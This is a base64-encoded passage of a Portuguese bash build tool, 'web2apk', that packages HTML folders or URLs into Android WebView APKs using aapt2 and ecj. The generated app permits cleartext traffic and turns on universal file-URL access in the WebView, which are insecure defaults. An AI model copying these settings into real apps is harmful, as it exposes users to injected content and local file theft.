wogIHByaW50ZiAnICBcMDMzWzE7MzJtdGVtcGxhdGU6XDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlICAgICAgICAgICAg4oCUIG1lbnUgaW50ZXJhdGl2byBkZSB0ZW1wbGF0ZXNcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgYmFzaWMgICAgICDigJQgZ2VyYSBiYXNpY2FwcC8gY29tIEhUTUwrQ1NTK0pTXDAzM1swbVxuJwogIHByaW50ZiAnICAgIFwwMzNbMDs5MG13ZWIyYXBrIHRlbXBsYXRlIGdhbWUgICAgICAg4oCUIGdlcmEgZ2FtZWFwcC8gY29tIGpvZ28gU25ha2VcMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgdGVtcGxhdGUgcHdhICAgICAgICDigJQgZ2VyYSBwd2FhcHAvIGNvbSBQV0Egb2ZmbGluZVwwMzNbMG1cblxuJwogIHByaW50ZiAnICBcMDMzWzE7MzJtTWFudWFsIGRlIGFycXVpdm9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayAtLW1hbiAg4oCUIGV4cGxpY2EgbyBxdWUgY2FkYSBhcnF1aXZvIChIVE1ML0NTUy9KUykgZGV2ZSBjb250ZXJcMDMzWzBtXG5cbicKICBwcmludGYgJyAgXDAzM1sxOzMybUV4ZW1wbG9zOlwwMzNbMG1cbicKICBwcmludGYgJyAgICBcMDMzWzA7OTBtd2ViMmFwayBidWlsZCAuL21ldWFwcC9cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLi9hcHAvIC0tbmFtZSBcIlZQTi1YXCIgLS1wa2duYW1lIGNvbS5teXZwbnggLS1wZXJtIGludGVybmV0LGNhbWVyYSAtLWZ1bGxzY3JlZW5cMDMzWzBtXG4nCiAgcHJpbnRmICcgICAgXDAzM1swOzkwbXdlYjJhcGsgYnVpbGQgLS11cmwgaHR0cHM6Ly9leGVtcGxvLmNvbSAtLW5hbWUgXCJNZXUgU2l0ZVwiXDAzM1swbVxuXG4nCn0KX2NtZF9idWlsZCgpIHsKICBsb2NhbCBTUkNfRElSPScnIExPQURfVVJMPScnIEFQUF9OQU1FPScnIFBLR19OQU1FPScnIElDT05fU1JDPScnCiAgbG9jYWwgT1VUX0FQSz0nJyBQRVJNUz0nJyBWRVJTSU9OX05BTUU9JzEuMC4wJyBWRVJTSU9OX0NPREU9MQogIGxvY2FsIE1JTl9TREs9MjEgVEFSR0VUX1NESz0zMyBPUklFTlRBVElPTj0ndW5zcGVjaWZpZWQnCiAgbG9jYWwgRlVMTFNDUkVFTj0wIFRIRU1FPSdsaWdodCcgTk9fSU5URVJORVQ9MAoKICB3aGlsZSBbICQjIC1ndCAwIF07IGRvCiAgICBjYXNlICIkMSIgaW4KICAgICAgLS11cmwpICAgICAgICAgIExPQURfVVJMPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW5hbWUpICAgICAgICAgQVBQX05BTUU9IiQyIjsgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGtnbmFtZSkgICAgICBQS0dfTkFNRT0iJDIiOyAgICAgIHNoaWZ0IDIgOzsKICAgICAgLS1pY29uKSAgICAgICAgIElDT05fU1JDPSIkMiI7ICAgICAgc2hpZnQgMiA7OwogICAgICAtLW91dCkgICAgICAgICAgT1VUX0FQSz0iJDIiOyAgICAgICBzaGlmdCAyIDs7CiAgICAgIC0tcGVybXwtLXBlcm1zKSBQRVJNUz0iJFBFUk1TLCQyIjsgc2hpZnQgMiA7OwogICAgICAtLXZlcnNpb24pICAgICAgVkVSU0lPTl9OQU1FPSIkMiI7ICBzaGlmdCAyIDs7CiAgICAgIC0tdmVyc2lvbmNvZGUpICBWRVJTSU9OX0NPREU9IiQyIjsgIHNoaWZ0IDIgOzsKICAgICAgLS1taW4tc2RrKSAgICAgIE1JTl9TREs9IiQyIjsgICAgICAgc2hpZnQgMiA7OwogICAgICAtLXRhcmdldC1zZGspICAgVEFSR0VUX1NESz0iJDIiOyAgICBzaGlmdCAyIDs7CiAgICAgIC0tb3JpZW50YXRpb24pICBPUklFTlRBVElPTj0iJDIiOyAgIHNoaWZ0IDIgOzsKICAgICAgLS1mdWxsc2NyZWVuKSAgIEZVTExTQ1JFRU49MTsgICAgICAgc2hpZnQgOzsKICAgICAgLS10aGVtZSkgICAgICAgIFRIRU1FPSIkMiI7ICAgICAgICAgc2hpZnQgMiA7OwogICAgICAtLW5vLWludGVybmV0KSAgTk9fSU5URVJORVQ9MTsgICAgICBzaGlmdCA7OwogICAgICAtLSopICAgICAgICAgICAgX3dhcm4gIk9wY2FvIGRlc2NvbmhlY2lkYTogJDEiOyBzaGlmdCA7OwogICAgICAqKSBbIC16ICIkU1JDX0RJUiIgXSAmJiBbIC16ICIkTE9BRF9VUkwiIF0gJiYgU1JDX0RJUj0iJDEiOyBzaGlmdCA7OwogICAgZXNhYwogIGRvbmUKCiAgWyAtZiAiJFcyQV9KQVIiIF0gfHwgX2VyciAnYW5kcm9pZC5qYXIgYXVzZW50ZS4gRXhlY3V0ZTogeHBtIGluc3RhbGwgd2ViMmFwaycKICBpZiBbIC16ICIkTE9BRF9VUkwiIF07IHRoZW4KICAgIFsgLXogIiRTUkNfRElSIiBdICYmIHsgX2NtZF9oZWxwOyBleGl0IDE7IH0KICAgIFsgLWQgIiRTUkNfRElSIiBdIHx8IF9lcnIgIkRpcmV0b3JpbyBuYW8gZW5jb250cmFkbzogJFNSQ19ESVIiCiAgICBbIC1mICIkU1JDX0RJUi9pbmRleC5odG1sIiBdIHx8IF93YXJuICdpbmRleC5odG1sIG5hbyBlbmNvbnRyYWRvJwogIGZpCgogIGxvY2FsIERJUl9CQVNFOyBESVJfQkFTRT0kKGJhc2VuYW1lICIke1NSQ19ESVIlL30iKQogIFsgLXogIiRBUFBfTkFNRSIgXSAmJiBBUFBfTkFNRT0iJHtESVJfQkFTRTotV2ViQXBwfSIKICBsb2NhbCBQS0dfU0FGRTsgUEtHX1NBRkU9JChwcmludGYgJyVzJyAiJEFQUF9OQU1FIiB8IHRyICdBLVonICdhLXonIHwgc2VkICdzL1teYS16MC05XS9fL2c7cy9fXyovXy9nJykKICBbIC16ICIkUEtHX05BTUUiIF0gJiYgUEtHX05BTUU9ImNvbS5lbGxpb3Rvcy53ZWJhcGsuJHtQS0dfU0FGRX0iCiAgWyAteiAiJE9VVF9BUEsiICBdICYmIE9VVF9BUEs9IiR7QVBQX05BTUUvLyAvX30uYXBrIgogIFsgIiROT19JTlRFUk5FVCIgLWVxIDAgXSAmJiBQRVJNUz0iaW50ZXJuZXQsJFBFUk1TIgoKICBfaGVhZCAnd2ViMmFwayBidWlsZCcKICBfaW5mbyAiQXBwICAgICA6ICRBUFBfTkFNRSIKICBfaW5mbyAiUGFja2FnZSA6ICRQS0dfTkFNRSIKICBfaW5mbyAiU2FpZGEgICA6ICRPVVRfQVBLIgogIFsgLW4gIiRMT0FEX1VSTCIgXSAmJiBfaW5mbyAiVVJMICAgICA6ICRMT0FEX1VSTCIKICBbIC1uICIkU1JDX0RJUiIgIF0gJiYgX2luZm8gIkZvbnRlICAgOiAkU1JDX0RJUiIKCiAgbG9jYWwgQlVJTEQKICBCVUlMRD0kKG1rdGVtcCAtZCAvZGF0YS9kYXRhL2NvbS50ZXJtdXgvZmlsZXMvdXNyL3RtcC93ZWIyYXBrLlhYWFhYWCAyPi9kZXYvbnVsbCkgXAogICAgfHwgQlVJTEQ9JChta3RlbXAgLWQgIiRIT01FLy54cG0vd2ViMmFway9idWlsZC5YWFhYWFgiKQogIHRyYXAgJ3JtIC1yZiAiJEJVSUxEIicgRVhJVAoKICBsb2NhbCBQS0dfUEFUSDsgUEtHX1BBVEg9JChwcmludGYgJyVzJyAiJFBLR19OQU1FIiB8IHRyICcuJyAnLycpCiAgbWtkaXIgLXAgIiRCVUlMRC9zcmMvJFBLR19QQVRIIiAiJEJVSUxEL2NsYXNzZXMiICIkQlVJTEQvcmVzX2NvbXBpbGVkIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvdmFsdWVzIiAiJEJVSUxEL3Jlcy94bWwiICIkQlVJTEQvYXNzZXRzL3d3dyIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLW1kcGkiICAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpIiBcCiAgICAgICAgICAgIiRCVUlMRC9yZXMvZHJhd2FibGUteGhkcGkiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4aGRwaSIgXAogICAgICAgICAgICIkQlVJTEQvcmVzL2RyYXdhYmxlLXh4eGhkcGkiCgogICMg4pSA4pSAIMONY29uZSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBfaW5mbyAnUHJlcGFyYW5kbyBpY29uZS4uLicKICBpZiBbIC1uICIkSUNPTl9TUkMiIF0gJiYgWyAtZiAiJElDT05fU1JDIiBdOyB0aGVuCiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUtbWRwaS9pY29uLnBuZyIgICAgNDgKICAgIF9yZXNpemVfaWNvbiAiJElDT05fU1JDIiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX3Jlc2l6ZV9pY29uICIkSUNPTl9TUkMiICIkQlVJTEQvcmVzL2RyYXdhYmxlLXhoZHBpL2ljb24ucG5nIiAgIDk2CiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHhoZHBpL2ljb24ucG5nIiAgMTQ0CiAgICBfcmVzaXplX2ljb24gIiRJQ09OX1NSQyIgIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgZWxzZQogICAgWyAtbiAiJElDT05fU1JDIiBdICYmIF93YXJuICJJY29uZSBuYW8gZW5jb250cmFkbzogJElDT05fU1JDIC0tIHVzYW5kbyBnZXJhZG8iCiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUtbWRwaS9pY29uLnBuZyIgICAgNDgKICAgIF9nZW5faWNvbiAiJEJVSUxEL3Jlcy9kcmF3YWJsZS1oZHBpL2ljb24ucG5nIiAgICA3MgogICAgX2dlbl9pY29uICIkQlVJTEQvcmVzL2RyYXdhYmxlLXhoZHBpL2ljb24ucG5nIiAgIDk2CiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUteHhoZHBpL2ljb24ucG5nIiAgMTQ0CiAgICBfZ2VuX2ljb24gIiRCVUlMRC9yZXMvZHJhd2FibGUteHh4aGRwaS9pY29uLnBuZyIgMTkyCiAgZmkKCiAgIyDilIDilIAgQXNzZXRzIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIFsgLW4gIiRTUkNfRElSIiBdICYmIFsgLWQgIiRTUkNfRElSIiBdICYmIHsKICAgIGNwIC1yICIkU1JDX0RJUiIvLiAiJEJVSUxEL2Fzc2V0cy93d3cvIgogICAgX2luZm8gIkFzc2V0cyBjb3BpYWRvcyAoJChmaW5kICIkQlVJTEQvYXNzZXRzL3d3dyIgLXR5cGUgZiB8IHdjIC1sKSBhcnF1aXZvcykiCiAgfQoKICAjIOKUgOKUgCBzdHJpbmdzLnhtbCDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBleHBvcnQgVzJBX0FQUD0iJEFQUF9OQU1FIiBXMkFfQlVJTEQ9IiRCVUlMRCIKICBweXRob24zIC1jICIKaW1wb3J0IHN5cywgb3MKYXBwID0gb3MuZW52aXJvbi5nZXQoJ1cyQV9BUFAnLCdBcHAnKQpvdXQgPSBvcy5lbnZpcm9uLmdldCgnVzJBX0JVSUxEJywnJykgKyAnL3Jlcy92YWx1ZXMvc3RyaW5ncy54bWwnCiMgRXNjYXBhciBjYXJhY3RlcmVzIGVzcGVjaWFpcyBYTUwKYXBwID0gYXBwLnJlcGxhY2UoJyYnLCcmYW1wOycpLnJlcGxhY2UoJzwnLCcmbHQ7JykucmVwbGFjZSgnPicsJyZndDsnKS5yZXBsYWNlKCdcIicsJyZxdW90OycpCm9wZW4ob3V0LCd3Jykud3JpdGUoJzw/eG1sIHZlcnNpb249XCIxLjBcIiBlbmNvZGluZz1cInV0Zi04XCI/PlxuPHJlc291cmNlcz5cbiAgICA8c3RyaW5nIG5hbWU9XCJhcHBfbmFtZVwiPicgKyBhcHAgKyAnPC9zdHJpbmc+XG48L3Jlc291cmNlcz5cbicpCiIKCiAgIyDilIDilIAgbmV0d29ya19zZWN1cml0eV9jb25maWcueG1sIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGNhdCA+ICIkQlVJTEQvcmVzL3htbC9uZXR3b3JrX3NlY3VyaXR5X2NvbmZpZy54bWwiIDw8ICdOU0VPRicKPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPG5ldHdvcmstc2VjdXJpdHktY29uZmlnPgogICAgPGJhc2UtY29uZmlnIGNsZWFydGV4dFRyYWZmaWNQZXJtaXR0ZWQ9InRydWUiPgogICAgICAgIDx0cnVzdC1hbmNob3JzPjxjZXJ0aWZpY2F0ZXMgc3JjPSJzeXN0ZW0iLz48L3RydXN0LWFuY2hvcnM+CiAgICA8L2Jhc2UtY29uZmlnPgo8L25ldHdvcmstc2VjdXJpdHktY29uZmlnPgpOU0VPRgoKICAjIOKUgOKUgCBQZXJtaXNzw7VlcyDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBsb2NhbCBQRVJNU19MSVNUCiAgUEVSTVNfTElTVD0kKHByaW50ZiAnJXMnICIkUEVSTVMiIHwgdHIgJywnICdcbicgfCB3aGlsZSByZWFkIC1yIHA7IGRvIF9wZXJtX3Jlc29sdmUgIiRwIjsgZG9uZSB8IHNvcnQgLXUgfCB0ciAnXG4nICd8JykKCiAgIyDilIDilIAgQW5kcm9pZE1hbmlmZXN0LnhtbCB2aWEgUHl0aG9uIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAogIGxvY2FsIE9SSUVOVF9BTkRST0lEPSd1bnNwZWNpZmllZCcKICBjYXNlICIkT1JJRU5UQVRJT04iIGluCiAgICBwb3J0cmFpdCkgIE9SSUVOVF9BTkRST0lEPSdwb3J0cmFpdCcgOzsKICAgIGxhbmRzY2FwZSkgT1JJRU5UX0FORFJPSUQ9J2xhbmRzY2FwZScgOzsKICAgIGF1dG8pICAgICAgT1JJRU5UX0FORFJPSUQ9J2Z1bGxTZW5zb3InIDs7CiAgZXNhYwoKICBleHBvcnQgVzJBX1BLRz0iJFBLR19OQU1FIiBXMkFfVkM9IiRWRVJTSU9OX0NPREUiIFcyQV9WTj0iJFZFUlNJT05fTkFNRSIgXAogICAgICAgICBXMkFfTUlOU0RLPSIkTUlOX1NESyIgVzJBX1RHVFNESz0iJFRBUkdFVF9TREsiIFwKICAgICAgICAgVzJBX09SSUVOVD0iJE9SSUVOVF9BTkRST0lEIiBXMkFfUEVSTVM9IiRQRVJNU19MSVNUIgoKICBweXRob24zIC1jICIKaW1wb3J0IG9zCmJ1aWxkICA9IG9zLmVudmlyb25bJ1cyQV9CVUlMRCddCnBrZyAgICA9IG9zLmVudmlyb25bJ1cyQV9QS0cnXQp2YyAgICAgPSBvcy5lbnZpcm9uWydXMkFfVkMnXQp2biAgICAgPSBvcy5lbnZpcm9uWydXMkFfVk4nXQptaW5zZGsgPSBvcy5lbnZpcm9uWydXMkFfTUlOU0RLJ10KdGd0c2RrID0gb3MuZW52aXJvblsnVzJBX1RHVFNESyddCm9yaWVudCA9IG9zLmVudmlyb25bJ1cyQV9PUklFTlQnXQpwZXJtcyAgPSBbcCBmb3IgcCBpbiBvcy5lbnZpcm9uWydXMkFfUEVSTVMnXS5zcGxpdCgnfCcpIGlmIHBdCnB4bWwgICA9ICcnLmpvaW4oJyAgICA8dXNlcy1wZXJtaXNzaW9uIGFuZHJvaWQ6bmFtZT1cIicgKyBwICsgJ1wiLz5cbicgZm9yIHAgaW4gcGVybXMpCnhtbCAgICA9ICgnPD94bWwgdmVyc2lvbj1cIjEuMFwiIGVuY29kaW5nPVwidXRmLThcIj8+XG4nCiAgICAgICAgICAnPG1hbmlmZXN0IHhtbG5zOmFuZHJvaWQ9XCJodHRwOi8vc2NoZW1hcy5hbmRyb2lkLmNvbS9hcGsvcmVzL2FuZHJvaWRcIlxuJwogICAgICAgICAgJyAgICBwYWNrYWdlPVwiJyArIHBrZyArICdcIlxuJwogICAgICAgICAgJyAgICBhbmRyb2lkOnZlcnNpb25Db2RlPVwiJyArIHZjICsgJ1wiXG4nCiAgICAgICAgICAnICAgIGFuZHJvaWQ6dmVyc2lvbk5hbWU9XCInICsgdm4gKyAnXCI+XG4nCiAgICAgICAgICAnICAgIDx1c2VzLXNkayBhbmRyb2lkOm1pblNka1ZlcnNpb249XCInICsgbWluc2RrICsgJ1wiIGFuZHJvaWQ6dGFyZ2V0U2RrVmVyc2lvbj1cIicgKyB0Z3RzZGsgKyAnXCIvPlxuJwogICAgICAgICAgKyBweG1sICsKICAgICAgICAgICcgICAgPGFwcGxpY2F0aW9uIGFuZHJvaWQ6bGFiZWw9XCJAc3RyaW5nL2FwcF9uYW1lXCIgYW5kcm9pZDppY29uPVwiQGRyYXdhYmxlL2ljb25cIlxuJwogICAgICAgICAgJyAgICAgICAgYW5kcm9pZDpoYXJkd2FyZUFjY2VsZXJhdGVkPVwidHJ1ZVwiIGFuZHJvaWQ6dXNlc0NsZWFydGV4dFRyYWZmaWM9XCJ0cnVlXCJcbicKICAgICAgICAgICcgICAgICAgIGFuZHJvaWQ6bmV0d29ya1NlY3VyaXR5Q29uZmlnPVwiQHhtbC9uZXR3b3JrX3NlY3VyaXR5X2NvbmZpZ1wiPlxuJwogICAgICAgICAgJyAgICAgICAgPGFjdGl2aXR5IGFuZHJvaWQ6bmFtZT1cIi5XZWJBY3Rpdml0eVwiIGFuZHJvaWQ6ZXhwb3J0ZWQ9XCJ0cnVlXCJcbicKICAgICAgICAgICcgICAgICAgICAgICBhbmRyb2lkOnNjcmVlbk9yaWVudGF0aW9uPVwiJyArIG9yaWVudCArICdcIlxuJwogICAgICAgICAgJyAgICAgICAgICAgIGFuZHJvaWQ6Y29uZmlnQ2hhbmdlcz1cIm9yaWVudGF0aW9ufHNjcmVlblNpemV8a2V5Ym9hcmRIaWRkZW5cIj5cbicKICAgICAgICAgICcgICAgICAgICAgICA8aW50ZW50LWZpbHRlcj5cbicKICAgICAgICAgICcgICAgICAgICAgICAgICAgPGFjdGlvbiBhbmRyb2lkOm5hbWU9XCJhbmRyb2lkLmludGVudC5hY3Rpb24uTUFJTlwiLz5cbicKICAgICAgICAgICcgICAgICAgICAgICAgICAgPGNhdGVnb3J5IGFuZHJvaWQ6bmFtZT1cImFuZHJvaWQuaW50ZW50LmNhdGVnb3J5LkxBVU5DSEVSXCIvPlxuJwogICAgICAgICAgJyAgICAgICAgICAgIDwvaW50ZW50LWZpbHRlcj5cbicKICAgICAgICAgICcgICAgICAgIDwvYWN0aXZpdHk+XG4nCiAgICAgICAgICAnICAgIDwvYXBwbGljYXRpb24+XG4nCiAgICAgICAgICAnPC9tYW5pZmVzdD5cbicpCm9wZW4oYnVpbGQgKyAnL0FuZHJvaWRNYW5pZmVzdC54bWwnLCAndycpLndyaXRlKHhtbCkKcHJpbnQoJyAgTWFuaWZlc3Q6ICcgKyBidWlsZCArICcvQW5kcm9pZE1hbmlmZXN0LnhtbCcpCiIKCiAgIyDilIDilIAgV2ViQWN0aXZpdHkuamF2YSDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKICBsb2NhbCBKQVZBX0ZTIEpBVkFfVEhFTUUgSkFWQV9MT0FECiAgWyAiJEZVTExTQ1JFRU4iIC1lcSAxIF0gXAogICAgJiYgSkFWQV9GUz0nICAgICAgICByZXF1ZXN0V2luZG93RmVhdHVyZShhbmRyb2lkLnZpZXcuV2luZG93LkZFQVRVUkVfTk9fVElUTEUpOyBnZXRXaW5kb3coKS5zZXRGbGFncyhhbmRyb2lkLnZpZXcuV2luZG93TWFuYWdlci5MYXlvdXRQYXJhbXMuRkxBR19GVUxMU0NSRUVOLCBhbmRyb2lkLnZpZXcuV2luZG93TWFuYWdlci5MYXlvdXRQYXJhbXMuRkxBR19GVUxMU0NSRUVOKTsnIFwKICAgIHx8IEpBVkFfRlM9JyAgICAgICAgLy8gc3RhdHVzIGJhciBub3JtYWwnCiAgY2FzZSAiJFRIRU1FIiBpbgogICAgZGFyaykgICAgICAgIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHhGRjAwMDAwMCk7JyA7OwogICAgdHJhbnNwYXJlbnQpIEpBVkFfVEhFTUU9JyAgICAgICAgdy5zZXRCYWNrZ3JvdW5kQ29sb3IoMHgwMDAwMDAwMCk7JyA7OwogICAgKikgICAgICAgICAgIEpBVkFfVEhFTUU9JyAgICAgICAgLy8gZnVuZG8gcGFkcmFvJyA7OwogIGVzYWMKICBbIC1uICIkTE9BRF9VUkwiIF0gJiYgSkFWQV9MT0FEPSIkTE9BRF9VUkwiIFwKICAgICAgICAgICAgICAgICAgICAgfHwgSkFWQV9MT0FEPSdmaWxlOi8vL2FuZHJvaWRfYXNzZXQvd3d3L2luZGV4Lmh0bWwnCgogIGNhdCA+ICIkQlVJTEQvc3JjLyRQS0dfUEFUSC9XZWJBY3Rpdml0eS5qYXZhIiA8PCBKQVZBRU9GCnBhY2thZ2UgJFBLR19OQU1FOwppbXBvcnQgYW5kcm9pZC5hcHAuQWN0aXZpdHk7CmltcG9ydCBhbmRyb2lkLm9zLkJ1bmRsZTsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlNldHRpbmdzOwppbXBvcnQgYW5kcm9pZC53ZWJraXQuV2ViVmlldzsKaW1wb3J0IGFuZHJvaWQud2Via2l0LldlYlZpZXdDbGllbnQ7CnB1YmxpYyBjbGFzcyBXZWJBY3Rpdml0eSBleHRlbmRzIEFjdGl2aXR5IHsKICAgIHByaXZhdGUgV2ViVmlldyB3OwogICAgQE92ZXJyaWRlIHB1YmxpYyB2b2lkIG9uQ3JlYXRlKEJ1bmRsZSBiKSB7CiAgICAgICAgc3VwZXIub25DcmVhdGUoYik7CiRKQVZBX0ZTCiAgICAgICAgdyA9IG5ldyBXZWJWaWV3KHRoaXMpOwokSkFWQV9USEVNRQogICAgICAgIHNldENvbnRlbnRWaWV3KHcpOwogICAgICAgIFdlYlNldHRpbmdzIHMgPSB3LmdldFNldHRpbmdzKCk7CiAgICAgICAgcy5zZXRKYXZhU2NyaXB0RW5hYmxlZCh0cnVlKTsgcy5zZXREb21TdG9yYWdlRW5hYmxlZCh0cnVlKTsKICAgICAgICBzLnNldEFsbG93RmlsZUFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsgcy5zZXRBbGxvd1VuaXZlcnNhbEFjY2Vzc0Zyb21GaWxlVVJMcyh0cnVlKTsKICAgICAgICBzLnNldEJ1aWx0SW5ab29tQ29udHJvbHMoZmFsc2UpOyBzLnNldERpc3BsYXlab29tQ29udHJvbHMoZmFsc2UpOwogICAgICAgIHMuc2V0VXNlV2lkZVZpZXdQb3J0KHRydWUpOyBzLnNldExvYWRXaXRoT3ZlcnZpZXdNb2RlKHRydWUpOwogICAgICAgIHcuc2V0V2ViVmlld0NsaWVudChuZXcgV2ViVmlld0NsaWVudCgpKTsKICAgICAgICB3LmxvYWRVcmwoIiRKQVZBX0xPQUQiKTsKICAgIH0KICAgIEBPdmVycmlkZSBwdWJsaWMgdm9pZCBvbkJhY2tQcmVzc2VkKCkgeyBpZiAody5jYW5Hb0JhY2soKSkgdy5nb0JhY2soKTsgZWxzZSBzdXBlci5vbkJhY2tQcmVzc2VkKCk7IH0KICAgIEBPdmVycmlkZSBwcm90ZWN0ZWQgdm9pZCBvblJlc3VtZSgpIHsgc3VwZXIub25SZXN1bWUoKTsgdy5vblJlc3VtZSgpOyB9CiAgICBAT3ZlcnJpZGUgcHJvdGVjdGVkIHZvaWQgb25QYXVzZSgpICB7IHN1cGVyLm9uUGF1c2UoKTsgIHcub25QYXVzZSgpOyAgfQp9CkpBVkFFT0YKCiAgIyDilIDilIAgUGlwZWxpbmUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgX2luZm8gJ2FhcHQyIGNvbXBpbGUuLi4nCiAgYWFwdDIgY29tcGlsZSAtLWRpciAiJEJVSUxEL3JlcyIgLW8gIiRCVUlMRC9yZXNfY29tcGlsZWQvIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQoKICBfaW5mbyAnYWFwdDIgbGluay4uLicKICBhYXB0MiBsaW5rIC0tbWFuaWZlc3QgIiRCVUlMRC9BbmRyb2lkTWFuaWZlc3QueG1sIiBcCiAgICAtSSAiJFcyQV9KQVIiIC1BICIkQlVJTEQvYXNzZXRzIiBcCiAgICAiJEJVSUxEL3Jlc19jb21waWxlZC8iKi5mbGF0IFwKICAgIC1vICIkQlVJTEQvdW5zaWduZWQuYXBrIiAyPiYxIFwKICAgIHwgZ3JlcCAtdiAnXiQnIHwgd2hpbGUgSUZTPSByZWFkIC1yIGw7IGRvIF9kaW0gIiRsIjsgZG9uZQogIFsgLWYgIiRCVUlMRC91bnNpZ25lZC5hcGsiIF0gfHwgX2VyciAnYWFwdDIgbGluayBmYWxob3UnCgogIF9pbmZvICdDb21waWxhbmRvIEphdmEuLi4nCiAgbG9jYWwgSkFWQV9DT01QSUxFUgogIGlmICAgY29tbWFuZCAtdiBlY2ogICAgPi9kZXYvbnVsbCAyPiYxOyB0aGVuIEpBVkFfQ09NUElMRVI9J2VjaicKICBlbGlmIGNvbW1hbmQgLXYgamF2YWMgID4vZGV2L251bGwgMj4mMTsgdGhlbiBKQVZBX0NPTVBJTEVSPSdqYXZhYycKICBlbHNlIF9lcnIgJ0NvbXBpbGFkb3IgSmF2YSBuYW8gZW5jb250cmFkby4gSW5zdGFsZTogcGtnIGluc3RhbGwgZWNqJzsgZmkKICBfZGltICJVc2FuZG86ICRKQVZBX0NPTVBJTEVSIgogIGlmIFsgIiRKQVZBX0NPTVBJTEVSIiA9ICdlY2onIF07IHRoZW4KICAgIGVjaiAtc291cmNlIDcgLXRhcmdldCA3IC1jcCAiJFcyQV9KQVIiIFwKICAgICAgIiRCVUlMRC9zcmMvJFBLR19QQVRIL1dlYkFjdGl2aXR5LmphdmEiIFwKICAgICAgLWQgIiRCVUlMRC9jbGFzc2VzLyIgMj4mMSBcCiAgICAgIHwgZ3JlcCAtdiAnXiQnIHwgd